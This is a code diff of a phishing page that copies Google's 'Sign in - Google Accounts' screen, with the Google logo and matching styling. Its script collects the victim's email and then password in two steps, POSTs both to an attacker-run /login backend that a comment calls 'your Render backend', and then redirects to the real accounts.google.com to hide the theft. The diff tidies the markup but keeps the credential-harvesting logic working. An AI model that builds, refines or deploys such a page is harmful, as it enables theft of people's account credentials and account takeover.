@@ -5,128 +5,77 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Sign in - Google Accounts</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link
-      href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap"
-      rel="stylesheet"
-    />
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />
     <style>
-      body {
-        font-family: "Roboto", system-ui, sans-serif;
-      }
-      .google-logo {
-        height: 92px;
-      }
+      body { font-family: "Roboto", system-ui, sans-serif; }
+      .google-logo { height: 92px; }
     </style>
   </head>
   <body class="bg-[#f8f9fa] min-h-screen flex items-center justify-center p-4">
     <div class="w-full max-w-[368px] bg-white rounded-2xl shadow-xl p-10">
-      <!-- Google Logo -->
       <div class="flex justify-center mb-8">
-        <img
-          src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png"
-          alt="Google"
-          class="google-logo"
-        />
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google" class="google-logo" />
       </div>
 
-      <!-- Title -->
-      <h1 class="text-2xl font-normal text-center text-gray-900 mb-1">
-        Sign in
-      </h1>
+      <h1 class="text-2xl font-normal text-center text-gray-900 mb-1">Sign in</h1>
       <p class="text-center text-gray-600 mb-8">Use your Google Account</p>
-      <!-- Fake Login Form -->
+      
       <div class="space-y-6">
-        <!-- Email Input -->
         <div id="email-section">
-          <input
-            id="fake-email"
-            type="email"
-            placeholder="Email or phone"
-            class="w-full border border-gray-300 rounded-md px-4 py-3 focus:outline-none focus:border-blue-500"
-          />
+          <input id="fake-email" type="email" placeholder="Email or phone" class="w-full border border-gray-300 rounded-md px-4 py-3 focus:outline-none focus:border-blue-500" />
         </div>
 
-        <!-- Password Input (hidden initially) -->
         <div id="password-section" class="hidden">
-          <input
-            id="fake-password"
-            type="password"
-            placeholder="Password"
-            class="w-full border border-gray-300 rounded-md px-4 py-3 focus:outline-none focus:border-blue-500"
-          />
+          <input id="fake-password" type="password" placeholder="Password" class="w-full border border-gray-300 rounded-md px-4 py-3 focus:outline-none focus:border-blue-500" />
         </div>
 
-        <!-- Next Button -->
-        <button
-          id="next-button"
-          class="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-3 rounded-md"
-          onclick="handleNext()"
-        >
+        <button id="next-button" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-3 rounded-md" onclick="handleNext()">
           Next
         </button>
       </div>
-
-      <!-- Create Account Link -->
-      <div class="text-center mt-6 text-sm text-blue-600">
-        <a
-          href="https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin"
-          ;
-          class="hover:underline"
-          target="_blank"
-        >
-          Create account or find my account
-        </a>
-      </div>
     </div>
 
-    <!-- Script for handling steps & backend storage -->
     <script>
-      let step = 1; // Track step
+      let step = 1;
 
       function handleNext() {
         const emailField = document.getElementById("fake-email");
-        const passwordField = document.getElementById("fake-password");
+        const passwordSection = document.getElementById("password-section");
+        const passInput = document.getElementById("fake-password");
 
         if (step === 1) {
-          // Step 1: Show password input
           if (!emailField.value.trim()) {
             alert("Please enter your email");
             return;
           }
-          document
-            .getElementById("password-section")
-            .classList.remove("hidden");
-          passwordField.focus();
+          passwordSection.classList.remove("hidden");
+          passInput.focus();
           step = 2;
         } else if (step === 2) {
-          // Step 2: Send data to backend
-          if (!passwordField.value.trim()) {
+          if (!passInput.value.trim()) {
             alert("Please enter your password");
             return;
           }
 
+          // This sends the data to your Render backend
           fetch("/login", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
               email: emailField.value,
-              password: passwordField.value,
+              password: passInput.value,
             }),
           })
-            .then((res) => res.json())
-            .then((data) => {
-              console.log(data); // optional success message
-              alert;
-              // Step 3: redirect to Google login
-              window.location.href =
-                "https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin";
-            })
-            .catch((err) => console.error(err));
+          .then((res) => res.json())
+          .then((data) => {
+            // Redirect to real Google after successful "login"
+            window.location.href = "https://accounts.google.com";
+          })
+          .catch((err) => console.error("Error saving data:", err));
         }
       }
 
-      // Optional: Press Enter to submit
-      document.addEventListener("keypress", function (e) {
+      document.addEventListener("keypress", (e) => {
         if (e.key === "Enter") handleNext();
       });
     </script>
